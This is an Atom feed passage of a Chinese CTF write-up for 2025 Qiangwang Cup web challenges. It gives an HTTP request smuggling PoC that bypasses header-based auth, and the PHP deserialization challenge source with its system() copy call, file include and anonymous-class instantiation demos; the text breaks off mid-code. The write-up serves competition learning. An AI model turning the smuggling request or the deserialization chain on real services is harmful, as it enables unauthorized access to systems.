<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>n4c1&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2025-10-20T13:42:56.712Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>n4c1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2025 强网杯S9 WEB WP 题解</title>
    <link href="http://example.com/2025/10/20/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-WEB-WP-%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2025/10/20/2025-%E5%BC%BA%E7%BD%91%E6%9D%AFS9-WEB-WP-%E9%A2%98%E8%A7%A3/</id>
    <published>2025-10-20T13:31:37.000Z</published>
    <updated>2025-10-20T13:42:56.712Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SecretVault"><a href="#SecretVault" class="headerlink" title="SecretVault"></a>SecretVault</h2><p>经典go前置python后置题目, 此类题目90%情况考虑请求走私</p><p>python端的鉴权可以由前端服务器的请求头完全决定<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020213353.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020213727.png" alt="image.png"><br>但当我尝试后发现无论如何也不可能使得uid为nil</p><p>最终发现此defcon议题:</p><p><a href="https://portswigger.net/research/http1-must-die">https://portswigger.net/research/http1-must-die</a></p><p>构造走私<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20251020213749.png" alt="image.png"><br>Poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/dashboard</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.147.132.32:18280</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>X-User</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">HTTP</span>/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: <span class="number">8.147.132.32:18280</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">141.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span>,en;q=<span class="number">0</span>.<span class="number">8</span></span></span><br></pre></td></tr></table></figure><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDgpeyRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzskcmFuZG9tU3RyaW5nID0gJyc7Zm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyRyID0gcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpIC0gMSk7JHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1skcl07fXJldHVybiAkcmFuZG9tU3RyaW5nO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL1NoYW5naGFpJyk7Y2xhc3MgdGVzdHtwdWJsaWMgJHJlYWRmbGFnO3B1YmxpYyAkZjtwdWJsaWMgJGtleTtwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+cmVhZGZsYWcgPSBuZXcgY2xhc3Mge3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe2lmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pICYmICRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA9PSAwKSB7JHRpbWUgPSBkYXRlKCdIaScpOyRmaWxlbmFtZSA9ICRHTE9CQUxTWydmaWxlbmFtZSddOyRzZWVkID0gJHRpbWUgLiBpbnR2YWwoJGZpbGVuYW1lKTttdF9zcmFuZCgkc2VlZCk7JHVwbG9hZERpciA9ICd1cGxvYWRzLyc7JGZpbGVzID0gZ2xvYigkdXBsb2FkRGlyIC4gJyonKTtmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHtpZiAoaXNfZmlsZSgkZmlsZSkpIHVubGluaygkZmlsZSk7fSRyYW5kb21TdHIgPSBnZW5lcmF0ZVJhbmRvbVN0cmluZyg4KTskbmV3RmlsZW5hbWUgPSAkdGltZSAuICcuJyAuICRyYW5kb21TdHIgLiAnLicgLiAnanBnJzskR0xPQkFMU1snZmlsZSddID0gJG5ld0ZpbGVuYW1lOyR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107JHVwbG9hZFBhdGggPSAkdXBsb2FkRGlyIC4gJG5ld0ZpbGVuYW1lOyBpZiAoc3lzdGVtKCJjcCAiLiR1cGxvYWRlZEZpbGUuIiAiLiAkdXBsb2FkUGF0aCkpIHtlY2hvICJzdWNjZXNzIHVwbG9hZCEiO30gZWxzZSB7ZWNobyAiZXJyb3IiO319fXB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3BocGluZm8oKTt9cHVibGljIGZ1bmN0aW9uIHJlYWRmbGFnKCl7ZnVuY3Rpb24gcmVhZGZsYWcoKXtpZiAoaXNzZXQoJEdMT0JBTFNbJ2ZpbGUnXSkpIHskZmlsZSA9ICRHTE9CQUxTWydmaWxlJ107JGZpbGUgPSBiYXNlbmFtZSgkZmlsZSk7aWYgKHByZWdfbWF0Y2goJy86XC9cLy8nLCAkZmlsZSkpZGllKCJlcnJvciIpOyRmaWxlX2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygidXBsb2Fkcy8iIC4gJGZpbGUpO2lmIChwcmVnX21hdGNoKCcvPFw/fFw6XC9cL3xwaHxcP1w9L2knLCAkZmlsZV9jb250ZW50KSkge2RpZSgiSWxsZWdhbCBjb250ZW50IGRldGVjdGVkIGluIHRoZSBmaWxlLiIpO31pbmNsdWRlKCJ1cGxvYWRzLyIgLiAkZmlsZSk7fX19fTt9cHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXskZnVuYyA9ICR0aGlzLT5mOyRHTE9CQUxTWydmaWxlbmFtZSddID0gJHRoaXMtPnJlYWRmbGFnO2lmICgkdGhpcy0+a2V5ID09ICdjbGFzcycpbmV3ICRmdW5jKCk7ZWxzZSBpZiAoJHRoaXMtPmtleSA9PSAnZnVuYycpIHskZnVuYygpO30gZWxzZSB7aGlnaGxpZ2h0X2ZpbGUoJ2luZGV4LnBocCcpO319fSRzZXIgPSBpc3NldCgkX0dFVFsnbGFuZCddKSA/ICRfR0VUWydsYW5kJ10gOiAnTzo0OiJ0ZXN0IjpOJztAdW5zZXJpYWxpemUoJHNlcik7&#x27;</span>));</span><br></pre></td></tr></table></figure><p>解码后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;readflag = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;upload file:\n&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line">                    <span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">                    <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">                    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line">                    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">                    <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$uploadDir</span> . <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">                    <span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.&#x27;</span> . <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">                    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>] = <span class="variable">$newFilename</span>;</span><br><span class="line">                    <span class="title function_ invoke__">var_dump</span>( <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">                    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$newFilename</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;cp &quot;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$uploadPath</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">system</span>(<span class="string">&quot;cp &quot;</span> . <span class="variable">$uploadedFile</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$uploadPath</span>)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;success upload!&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;error&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;call internal readflag\n&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">                    <span class="variable">$file</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/:\/\//&#x27;</span>, <span class="variable">$file</span>)) <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">                    <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?|\:\/\/|ph|\?\=/i&#x27;</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;Illegal content detected in the file.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">include</span>(<span class="string">&quot;uploads/&quot;</span> . <span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;f = <span class="string">&#x27;readflag&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable language_">$this</span>-&gt;readflag;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>((<span class="title function_ invoke__">get_class</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>])));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;class&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key == <span class="string">&#x27;func&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;readflag);</span><br><span class="line">            <span class="variable">$func</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;land&#x27;</span>] : <span class="string">&#x27;O:4:&quot;test&quot;:N&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br></pre></td></tr></table></figure><p>很明显考察php反序列化, 但是只给了一个test类, 以及其内部的匿名类</p><p>思路: 首先加载匿名类, 之后设法调用其中的readflag()方法</p><p>问题: 当 new $func(); 触发 __construct加载匿名类后, 得到的对象并没有被索引, 如何对其调用?</p><p>思路: 得到的对象已经被销毁, 但匿名类已经被加载, 是否可以再次直接索引到匿名类?</p><p>我们可以编写demo进行测试,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;readflag = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;construct readflag&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;called  readflag&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;f = <span class="string">&#x27;readflag&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;f;</span><br><span class="line">        <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable language_">$this</span>-&gt;readflag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_declared_classes</span>());</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">get_declared_classes</span>());</span><br></pre></td></tr></table></figure><p>输出:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">D:\softwares\phpstudy_pro\Extensions\php\php7.<span class="number">4.3</span>nts\php.exe -c D:\softwares\phpstudy_pro\Extensions\php\php7.<span class="number">4.3</span>nts\php.ini E:\CTFDoc\<span class="number">2025</span>\qwb\testezphp\test\<span class="number">2</span>.php</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">stdClass</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Exception</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="built_in">ErrorException</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    [<span class="number">142</span>] =&gt; Phar</span><br><span class="line">    [<span class="number">143</span>] =&gt; PharData</span><br><span class="line">    [<span class="number">144</span>] =&gt; PharFileInfo</span><br><span class="line">    [<span class="number">145</span>] =&gt; test</span><br><span class="line">)</span><br><span class="line">construct readflag</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">stdClass</span></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Exception</span></span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="built_in">ErrorException</span></span><br><span class="line">    [<span class="number">3</span>] =&gt; <span class="built_in">Error</span></span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">    [<span class="number">142</span>] =&gt; Phar</span><br><span class="line">    [<span class="number">143</span>] =&gt; PharData</span><br><span class="line">    [<span class="number">144</span>] =&gt; PharFileInfo</span><br><span class="line">    [<span class="number">145</span>] =&gt; <span class="keyword">class</span>@anonymous <span class="attr">E</span>:\CTFDoc\<span class="number">2025</span>\qwb\testezphp\test\<span class="number">2</span>.<span class="attr">php</span>:<span class="number">22</span>$<span class="number">0</span></span><br><span class="line">    [<span class="number">146</span>] =&gt; test</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看见, 虽然构造出的对象被销毁了, 但被加载过的匿名类依然存在</p><p>我们尝试直接使用这个匿名类的类名对其进行实例化, 在这之前我们需要注意, 匿名类名的结构:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>@<span class="title">anonymous</span>\0<span class="title">E</span>:\<span class="title">CTFDoc</span>\2025\<span class="title">qwb</span>\<span class="title">testezphp</span>\<span class="title">test</span>\2.<span class="title">php</span>:22$0</span></span><br></pre></td></tr></table></figure><p>最后的 22$0 , 22为其所处的行号, 0为匿名类序号, anonymous后有一个\0</p><p>编写demo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;readflag = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;\nconstruct readflag\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;\ncalled  readflag\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;f = <span class="string">&#x27;readflag&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="string">&#x27;func&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span 